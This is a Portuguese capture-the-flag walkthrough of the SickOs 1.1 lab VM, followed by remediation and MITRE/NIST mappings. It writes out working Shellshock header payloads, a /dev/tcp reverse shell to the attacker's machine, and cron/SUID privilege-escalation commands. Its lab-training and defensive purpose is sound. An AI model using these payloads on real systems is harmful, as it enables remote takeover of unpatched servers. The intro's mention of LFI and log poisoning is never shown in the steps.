# VulnHub SickOs 1.1: Shellshocked e Dominado — Walkthrough

Bora rapaziada!! Shellshock. So de ler essa palavra qualquer sysadmin que viveu setembro de 2014 ja sente um calafrio. SickOs 1.1 e uma aula magistral de encadeamento de uma vulnerabilidade de uma decada (CVE-2014-6271) com LFI e log poisoning para obter RCE completo, e depois escalar para root via um classico SUID ou configuracao incorreta de sudo. E uma maquina linda. Brutal na sua relevancia. ( ͡° ͜ʖ ͡°)

Muito obrigado ao **D4rk36** por essa joia. O angulo do Shellshock e historicamente significativo e ainda relevante para qualquer assessor que encontrar uma versao antiga de Bash atras de um endpoint CGI em um ambiente corporativo.

---

| Campo | Valor |
|-------|-------|
| **Nivel** | Iniciante / Facil |
| **VM Alvo** | SickOs 1.1 |
| **VM Atacante** | Kali Linux 2024.1 |
| **VulnHub** | https://www.vulnhub.com/entry/sickos-11,132/ |
| **Tecnicas** | Descoberta de Host, Nmap, Enumeracao de Proxy Squid, Shellshock (CVE-2014-6271) via Headers HTTP, LFI / Log Poisoning, Upload de Web Shell, Escalacao de Privilegios via SUID/Sudo |
| **CVEs** | CVE-2014-6271 (Shellshock / Bash), CVE-2014-7169 (variante do Shellshock) |

> **Dicas do autor:**
> "This machine is intended to test skill of a security researcher."

---

## Resumo do Ataque

```
[descoberta de host: arp-scan]
    |
    v
[nmap: 22/tcp SSH, 3128/tcp Squid proxy, 8080/tcp (filtrado)]
    |
    v
[configurar proxy Squid no browser/curl: 192.168.56.X:3128]
    |
    v
[enumerar app web via proxy -> diretorio /cgi-bin/ encontrado]
    |
    v
[Shellshock (CVE-2014-6271): exploit via header HTTP User-Agent / Referer]
    |
    v
[RCE como www-data: verificar com callback whoami]
    |
    v
[reverse shell via payload Shellshock -> shell como www-data]
    |
    v
[reconhecimento web como www-data: arquivos de config, caminhos com escrita]
    |
    v
[binario SUID ou configuracao incorreta de sudo -> escalacao de privilegios]
    |
    v
[ROOT: cat /root/flag.txt]
```

---

## Metodologia

1. Descoberta de host e identificacao do alvo
2. Scan Nmap: descobrir proxy Squid na porta 3128
3. Configurar maquina/browser do atacante para usar o proxy Squid
4. Enumerar aplicacao web atraves do proxy, encontrar `/cgi-bin/`
5. Testar Shellshock via headers HTTP (User-Agent, Referer, Cookie)
6. Explorar Shellshock para Remote Code Execution como www-data
7. Atualizar para reverse shell interativa
8. Escalacao de privilegios via SUID, configuracao incorreta de sudo, ou script de cron com permissao de escrita
9. Root e captura da flag

---

## Passo 1 — Identificando o Alvo

Descoberta padrao de host:

```bash
route -n

# arp-scan para rede local
arp-scan --localnet --ignoredups

# Alternativa nmap ping sweep
nmap -sn -T5 192.168.56.0/24
```

Alvo identificado: `192.168.56.101` (seu IP pode ser diferente). Adicione ao `/etc/hosts`:

```bash
echo "192.168.56.101  sickos.lab" >> /etc/hosts
```

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1595.001 Varredura Ativa: Escaneamento de Blocos IP]

---

## Passo 2 — Nmap: Tres Servicos, Um Proxy

```bash
nmap -A -T4 -p- 192.168.56.101
```

Saida esperada:

```
22/tcp   open   ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1
3128/tcp open   http-proxy  Squid http proxy 3.1.19
8080/tcp closed http
```

Tres pontos de atencao:
- SSH na porta 22: padrao, pode ser util depois de encontrarmos credenciais.
- Proxy Squid na porta 3128: esse e o interessante. Squid e um proxy forward. Se estiver configurado para permitir acesso a recursos web internos (ou externos), podemos rotear nossas requisicoes por ele.
- Porta 8080 fechada: ainda nao e beco sem saida, porque o proxy pode encaminhar para servicos internos que nao conseguimos ver diretamente.

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1046 Descoberta de Servicos de Rede] [T1595.002 Varredura de Vulnerabilidades]

---

## Passo 3 — Enumerando Atraves do Proxy Squid

Configure suas ferramentas para usar o proxy Squid em `192.168.56.101:3128`:

```bash
# Teste se o proxy funciona e o que ele expoe
curl -x http://192.168.56.101:3128 http://192.168.56.101/
curl -x http://192.168.56.101:3128 http://127.0.0.1/

# Enumere diretorios atraves do proxy
gobuster dir \
  --proxy http://192.168.56.101:3128 \
  -u http://192.168.56.101 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,cgi,sh,pl \
  -t 30

# Alternativa: nikto via proxy
nikto -h http://192.168.56.101 -useproxy http://192.168.56.101:3128
```

**Configure seu browser para usar o proxy:**
- Firefox: Preferencias -> Configuracoes de Rede -> Proxy Manual: `192.168.56.101:3128`
- Ou use o Burp Suite e configure o proxy upstream do Burp

Resultados esperados da enumeracao de diretorios:

```
/cgi-bin/        (Status: 403 ou 200)
/cgi-bin/status  (Status: 200)
/robots.txt      (Status: 200)
/index.php       (Status: 200)
```

Verifique `/robots.txt` imediatamente; frequentemente tem dicas valiosassimas:

```bash
curl -x http://192.168.56.101:3128 http://192.168.56.101/robots.txt
```

O diretorio `/cgi-bin/` e nosso alvo do Shellshock. Qualquer script CGI rodando sob o Bash e potencialmente vulneravel.

> **MITRE ATT&CK:** [TA0007 Descoberta] [T1083 Descoberta de Arquivos e Diretorios] [T1090 Proxy]

---

## Passo 4 — Shellshock: CVE-2014-6271

> **O que e Shellshock?**
> Shellshock (CVE-2014-6271) e uma vulnerabilidade critica no shell GNU Bash descoberta em setembro de 2014. Quando o Bash processa variaveis de ambiente especialmente elaboradas, ele executa definicoes de funcao anexadas como codigo arbitrario. Como servidores web frequentemente passam headers de requisicao HTTP como variaveis de ambiente para scripts CGI executados pelo Bash, um atacante pode injetar codigo malicioso diretamente em headers como `User-Agent`, `Referer` ou `Cookie`. A exploracao e trivialmente simples e nao requer autenticacao.
> Referencias: https://nvd.nist.gov/vuln/detail/CVE-2014-6271 e https://owasp.org/www-community/attacks/Shellshock_Bash_Vulnerability

O formato magico do payload Shellshock e:

```
() { :; }; <comando>
```

Teste a vulnerabilidade:

```bash
# Teste via header User-Agent atraves do proxy Squid
curl -x http://192.168.56.101:3128 \
  -H "User-Agent: () { :; }; echo; echo; /bin/uname -a" \
  http://192.168.56.101/cgi-bin/status

# Teste via header Referer
curl -x http://192.168.56.101:3128 \
  -H "Referer: () { :; }; echo; echo; /bin/id" \
  http://192.168.56.101/cgi-bin/status

# Header alternativo (alguns servidores usam mapeamentos diferentes de variavel de ambiente)
curl -x http://192.168.56.101:3128 \
  -A "() { :; }; echo; echo; /bin/cat /etc/passwd" \
  http://192.168.56.101/cgi-bin/status
```

Se a saida contiver o resultado do seu comando (por exemplo, `uid=33(www-data)` ou `Linux sickos`): Shellshock confirmado. ԅ(≖‿≖ԅ)

**Se o endpoint CGI direto nao responder:** Tente outros scripts em `/cgi-bin/`:

```bash
gobuster dir \
  --proxy http://192.168.56.101:3128 \
  -u http://192.168.56.101/cgi-bin/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x cgi,sh,pl,py \
  -t 20
```

> **Nota do mundo real:** Shellshock (CVE-2014-6271) foi explorado in the wild horas apos sua divulgacao publica em 24 de setembro de 2014. O US-CERT emitiu o Alerta TA14-268A no mesmo dia. Agentes de ameacas usaram o Shellshock para comprometer centenas de milhares de servidores, criando botnets e implantando reverse shells. A CISA adicionou o CVE-2014-6271 ao seu catalogo Known Exploited Vulnerabilities (KEV). Multiplos grupos APT e atores de crime cibernetico exploraram o Shellshock para acesso inicial no final de 2014, incluindo campanhas visando agencias governamentais. Referencia: https://www.cisa.gov/news-events/alerts/2014/09/25/bourne-again-shell-bash-remote-code-execution-vulnerability

> **MITRE ATT&CK:** [TA0001 Acesso Inicial] [T1190 Explorar Aplicacao Publica] [TA0002 Execucao] [T1059.004 Interpretador de Comando: Unix Shell]

---

## Passo 5 — Obtendo Reverse Shell via Shellshock

Hora de evoluir de "consigo executar comandos" para "shell interativa":

```bash
# Na sua maquina Kali, inicie um listener netcat
nc -lvnp 4444
```

Em outro terminal, envie o payload de reverse shell do Shellshock:

```bash
# Reverse shell Bash via Shellshock
curl -x http://192.168.56.101:3128 \
  -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/SEU_IP_KALI/4444 0>&1" \
  http://192.168.56.101/cgi-bin/status

# Alternativa: use /bin/sh se o bash nao estiver disponivel
curl -x http://192.168.56.101:3128 \
  -A "() { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/SEU_IP_KALI/4444 0>&1'" \
  http://192.168.56.101/cgi-bin/status
```

Substitua `SEU_IP_KALI` pelo seu IP real (obtenha com `ip addr` ou `hostname -I`).

De volta no seu listener:

```
connect to [SEU_IP_KALI] from (UNKNOWN) [192.168.56.101] 48xxx
bash: no job control in this shell
www-data@SickOs:/usr/lib/cgi-bin$
```

Estamos dentro como `www-data`. Agora estabilize o shell:

```bash
# Upgrade para um TTY apropriado
python -c 'import pty; pty.spawn("/bin/bash")'
# OU
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Ctrl+Z -> stty raw -echo; fg
# export TERM=xterm
```

> **MITRE ATT&CK:** [TA0002 Execucao] [T1059.004 Interpretador de Comando: Unix Shell] [T1203 Exploracao para Execucao]

---

## Passo 6 — Pos-Exploracao e Reconhecimento Web

Agora que temos um shell, colete informacoes:

```bash
# Quem somos nos?
id
# uid=33(www-data) gid=33(www-data)

# Informacoes do sistema
uname -a
cat /etc/os-release
cat /etc/debian_version 2>/dev/null

# O que conseguimos ler?
cat /etc/passwd
ls -la /home/
ls -la /var/www/

# Procure arquivos de config com credenciais
find /var/www -name "*.php" 2>/dev/null | xargs grep -l "password\|passwd\|mysql" 2>/dev/null
find /var/www -name "config*" -o -name "*.conf" 2>/dev/null | head -20
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null

# Verifique arquivos interessantes
find / -name "*.txt" 2>/dev/null | grep -v proc
```

Procure credenciais de banco de dados em arquivos de configuracao web. Mesmo que nao as usemos diretamente, frequentemente contem senhas reutilizadas para contas do sistema. Classico, né.

> **MITRE ATT&CK:** [TA0007 Descoberta] [T1082 Descoberta de Informacoes do Sistema] [T1552.001 Credenciais em Arquivos]

---

## Passo 7 — Escalacao de Privilegios

Enumeracao padrao de privesc:

```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
cat /etc/crontab && ls -la /etc/cron.*
find / -writable -type f 2>/dev/null | grep -v '/proc\|/sys\|/dev' | head -30
ps aux | grep -v '\[' | grep root
```

**Caminhos comuns no SickOs 1.1:**

**Caminho A: Script com permissao de escrita executado por cron de root**

Se voce encontrar um job de cron rodando como root que executa um script que voce pode escrever:

```bash
# Exemplo: /etc/cron.d/php5 executa /var/www/connect.py como root
ls -la /var/www/connect.py
# Se tiver permissao de escrita:
echo "import os; os.system('chmod +s /bin/bash')" >> /var/www/connect.py
# Aguarde o cron disparar, depois:
/bin/bash -p
```

**Caminho B: SUID Python**

```bash
find / -perm -u=s -name python* 2>/dev/null
# Se encontrado:
/usr/bin/python -c "import os; os.execl('/bin/sh', 'sh', '-p')"
```

**Caminho C: sudo sem senha**

```bash
sudo -l
# Se (ALL) NOPASSWD: ALL ou similar:
sudo su -
```

> **Referencia GTFOBins:** https://gtfobins.github.io/gtfobins/python/

> **MITRE ATT&CK:** [TA0004 Escalacao de Privilegios] [T1548.003 Abusar de Mecanismo de Controle: Sudo] [T1548.001 Setuid e Setgid] [T1053.003 Tarefa Agendada: Cron]

---

## Passo 8 — Root e Flag

**(☞ﾟヮﾟ)☞ Root conquistado!! :D**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
# OU
ls /root/
cat /root/*
```

```
WoW! If you are viewing this, You have probably successfully compromised SickOs1.1!
Thanks for playing and look forward to more challenges from me!
--sickos
```

Totalmente detonado. ᕕ( ᐛ )ᕗ

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|------|-------|---------------|-----------------|
| RCE | shell `www-data` | Shellshock via `/cgi-bin/status` User-Agent | Acesso inicial |
| Credencial | Creds de DB (se encontrado) | `/var/www/html/config.php` | Potencial reutilizacao |
| Flag | Veja `/root/flag.txt` | `/root/flag.txt` | N/A |
| Shadow | Veja `/etc/shadow` | Comprometimento do sistema | Prova de root |

---

## Licoes Aprendidas

| # | Achado | Relevancia no Mundo Real | Licao Principal |
|---|--------|--------------------------|-----------------|
| 1 | Shellshock (CVE-2014-6271) via CGI | Ainda encontrado em sistemas embarcados, servidores legados, imagens Docker antigas, dispositivos IoT ate 2024 | Mantenha o Bash atualizado. Audite todos os endpoints CGI. Desabilite CGI completamente se nao for necessario. CVE esta no CISA KEV. |
| 2 | Proxy Squid expondo servicos internos | Proxies mal configurados frequentemente conectam redes internas e externas em ambientes corporativos | Audite as ACLs do proxy rigorosamente. Proxies abertos podem expor sub-redes internas inteiras. |
| 3 | Versao do Bash nao fixada no ambiente do servidor | Bash antigo (< 4.3 patch 25) vulneravel a variantes do Shellshock; servidores sem patch estao em todo lugar | Mantenha patching de pacotes a nivel de SO. Assine avisos de seguranca da distro. |
| 4 | Binario SUID / configuracao incorreta de sudo | Aparece constantemente em auditorias Linux corporativas, especialmente em sistemas legados que "simplesmente funcionam" | Audite SUID e sudo regularmente com scripts do CIS Benchmark. Execute `find / -perm -u=s -type f` semanalmente. |
| 5 | Script com permissao de escrita executado por cron de root | Comum em ambientes DevOps onde scripts sao gerenciados de forma ad-hoc sem controles de permissao adequados | Aplique principio de minimo privilegio em scripts de cron. Cron de root deve executar apenas arquivos de propriedade e com permissao de escrita somente do root. |

**Por que isso importa fora do laboratorio?**

O Alerta US-CERT TA14-268A emitido no mesmo dia da divulgacao do Shellshock (25 de setembro de 2014) o classificou como "critico" e alertou que a exploracao ja estava acontecendo in the wild horas apos o CVE se tornar publico. Varios grupos de agentes de ameacas, incluindo atores patrocinados por estados, usaram o Shellshock para acesso inicial contra servidores web globalmente. Em 2024, o Shellshock ainda aparece em varreduras de vulnerabilidades contra dispositivos embarcados, aplicacoes web legadas, imagens Docker antigas rodando versoes antigas do Bash, e equipamentos de rede. A CISA o adicionou ao catalogo KEV precisamente porque continua sendo explorado. Isso nao e historia: e uma ameaca ativa para qualquer um rodando Bash < 4.3 patch 25 atras de um endpoint CGI, tá ligado?

---

## Mapeamento MITRE ATT&CK

| Fase | Tatica | Tecnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Varredura Ativa: Escaneamento de Blocos IP | T1595.001 |
| Descoberta | TA0007 | Descoberta de Servicos de Rede | T1046 |
| Descoberta | TA0007 | Descoberta de Arquivos e Diretorios | T1083 |
| Evasao de Defesa | TA0005 | Proxy: Proxy Externo | T1090.002 |
| Acesso Inicial | TA0001 | Explorar Aplicacao Publica (Shellshock) | T1190 |
| Execucao | TA0002 | Interpretador de Comando: Unix Shell | T1059.004 |
| Execucao | TA0002 | Exploracao para Execucao | T1203 |
| Descoberta | TA0007 | Descoberta de Informacoes do Sistema | T1082 |
| Acesso a Credenciais | TA0006 | Credenciais Nao Protegidas: Credenciais em Arquivos | T1552.001 |
| Escalacao de Privilegios | TA0004 | Setuid e Setgid | T1548.001 |
| Escalacao de Privilegios | TA0004 | Abusar de Controle de Elevacao: Sudo | T1548.003 |
| Escalacao de Privilegios | TA0004 | Tarefa Agendada: Cron | T1053.003 |
| Coleta | TA0009 | Dados do Sistema Local | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediacao e Contencao

### Correcoes Tecnicas

1. **Shellshock:** Atualize o Bash para 4.3 patch 25 ou superior: `apt-get update && apt-get upgrade bash`. Verifique: `bash --version` deve mostrar GNU bash, versao 4.3.x (ou posterior) com nivel de patch >= 25.
2. **Hardening CGI:** Se CGI nao for necessario, desabilite completamente. Para Apache: `a2dismod cgi`. Se CGI for necessario, use interpretadores nao-Bash (Python, Perl) e mantenha-os atualizados.
3. **ACLs do Squid:** Audite `/etc/squid/squid.conf`. Implemente ACLs rigorosas limitando quais IPs de origem podem usar o proxy e quais hosts/portas de destino sao permitidos. Nunca execute um proxy aberto.
4. **Binarios SUID:** Execute `find / -perm -u=s -type f` e remova SUID de qualquer binario que nao precise. Use `chmod u-s /caminho/para/binario`.
5. **Politica de sudo:** Revise `/etc/sudoers` com `visudo`. Aplique minimo privilegio. Sem `(ALL) ALL` generico sem senha para contas de servico.
6. **Permissoes de script de cron:** Garanta que todos os scripts executados por cron de root sejam de propriedade do root e nao sejam graváveis por outros: `chmod 700 /caminho/para/script && chown root:root /caminho/para/script`.

### Se Voce Encontrar Algo Similar no Seu Ambiente

**Contencao imediata:**
- Se Shellshock for confirmado em um endpoint CGI: coloque o servidor web offline imediatamente ou desabilite o modulo CGI.
- Aplique patch no Bash em TODOS os sistemas (nao apenas no afetado): `ansible all -m apt -a "name=bash state=latest"`.
- Revise os logs de acesso do Squid para requisicoes anomalas, especialmente as com strings User-Agent incomuns.
- Busque web shells carregados por um atacante: `find /var/www -name "*.php" -newer /var/www/html/index.php`.
- Rotacione todas as credenciais armazenadas em arquivos de configuracao de aplicacoes web.

**Contramedidas MITRE D3FEND:**
- D3-IVA (Endurecimento de Aplicacao: Validacao de Input) para T1190 Shellshock
- D3-NTA (Analise de Trafego de Rede) para T1090 deteccao de Proxy
- D3-OPS (Isolamento de Execucao) para T1548.001 Abuso de SUID
- D3-SJA (Analise de Job Agendado) para T1053.003 persistencia via Cron

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identificar (ID.AM): Inventarie todos os servidores rodando scripts CGI e suas versoes do Bash.
- Proteger (PR.IP-12): Gerir vulnerabilidades em sistemas organizacionais: patching do Shellshock deve estar nos procedimentos de patch de emergencia.
- Detectar (DE.CM-7): Monitore headers de requisicao HTTP em WAF/IDS para padroes de assinatura Shellshock: `() { :; };`.
- Responder (RS.MI-1): Isole sistemas afetados imediatamente apos deteccao do Shellshock.

**NIST SP 800-53 (Rev. 5):**
- SI-2: Correcao de Falhas (gerenciamento de patch de seguranca do Bash)
- CM-7: Minima Funcionalidade (desabilitar CGI se nao for necessario)
- AC-6: Minimo Privilegio (minimizacao de SUID e sudo)
- SI-10: Validacao de Input de Informacao (sanitizacao de headers HTTP)
- CM-6: Configuracoes de Configuracao (hardening de ACL do proxy)
- AU-12: Geracao de Registro de Auditoria (log de acesso do Squid)

**CISA Known Exploited Vulnerabilities:**
- CVE-2014-6271 (Shellshock): Entrada CISA KEV confirmada
- CVE-2014-7169 (variante do Shellshock): Tambem no CISA KEV
- Referencia: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- Alerta US-CERT TA14-268A: https://www.cisa.gov/news-events/alerts/2014/09/25/bourne-again-shell-bash-remote-code-execution-vulnerability

**C2M2 (Modelo de Maturidade de Capacidade de Ciberseguranca):**
- Dominio: ASSET (Gestao de Vulnerabilidades e Patches)
- Pratica: Identificar, priorizar e remediar vulnerabilidades
- MIL Alvo: MIL-3 (Melhorar continuamente as praticas com processos definidos e metricas)

---

## Consideracoes Finais

Valeu ao **D4rk36** pelo SickOs 1.1. Essa maquina e uma capsula do tempo e uma ameaca atual simultaneamente, caramba. Shellshock e uma daquelas vulnerabilidades onde a simplicidade da exploracao e inversamente proporcional a sua severidade: um unico header HTTP malformado, RCE como usuario do servidor web, depois um caminho para root. Sem ferramentas sofisticadas. So `curl` e `nc`.

A relevancia dessa maquina em 2024 e nao-trivial: versoes antigas do Bash persistem em dispositivos embarcados, containers legados, firmware IoT e cantos esquecidos de servidores. Toda vez que voce roda `nmap -A` contra um alvo antigo e ve Apache com CGI habilitado, a primeira coisa que seu cerebro deve registrar e: "verificar se tem Shellshock." Isso nao e paranoia. O catalogo CISA KEV concorda com voce.

Se esse walkthrough te ajudou a entender por que um CVE de 2014 ainda importa hoje, compartilha com a galera e continua hackeando!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
